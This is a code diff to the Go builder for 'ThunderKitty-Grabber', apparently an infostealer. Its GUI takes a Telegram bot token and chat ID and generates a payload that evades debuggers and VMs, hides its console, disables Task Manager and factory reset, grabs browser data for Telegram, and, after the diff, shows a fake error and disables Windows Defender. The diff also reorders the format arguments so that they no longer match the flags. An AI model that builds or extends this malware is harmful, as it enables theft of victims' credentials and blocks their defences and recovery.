@@ -7,22 +7,25 @@ import (
 	"runtime"
 
 	"fyne.io/fyne/v2"
+
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool) {
 	content := fmt.Sprintf(`
 package main
 
 import (
 	"ThunderKitty-Grabber/utils/antidbgandvm"
+	"ThunderKitty-Grabber/utils/fakeerror"
 	"ThunderKitty-Grabber/utils/browsers"
 	"ThunderKitty-Grabber/utils/hideconsole"
 	"ThunderKitty-Grabber/utils/disablefactoryreset"
 	"ThunderKitty-Grabber/utils/taskmanager"
 	"ThunderKitty-Grabber/utils/exclude"
+	"ThunderKitty-Grabber/utils/defender"
 	"fmt"
 )
 
@@ -42,8 +45,14 @@ func main() {
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
+	if %t {
+		go FakeError.Show()
+	} else {
+		fmt.Println("Fake error not enabled")
+	}
 
 	Exclude.FileExtensions()
+	Defender.Disable()
 	if %t {
 		browsers.ThunderKittyGrab(telebottoken, telechatid)
 	} else {
@@ -62,7 +71,7 @@ func main() {
 		fmt.Println("Task manager not disabled")
 	}
 }
-`, telebottoken, telechatid, enableAntiDebug, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -104,6 +113,7 @@ func main() {
 	telechatidEntry.SetPlaceHolder("Enter telechatid")
 
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
+	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
 	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
@@ -112,7 +122,7 @@ func main() {
 	buildButton := widget.NewButton("Build", func() {
 		telebottoken := telebottokenEntry.Text
 		telechatid := telechatidEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked)
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked)
 	})
 
 	form := container.NewVBox(
@@ -120,6 +130,7 @@ func main() {
 		telebottokenEntry,
 		telechatidEntry,
 		enableAntiDebug,
+		enableFakeError,
 		enableBrowsers,
 		hideConsole,
 		disableFactoryReset,
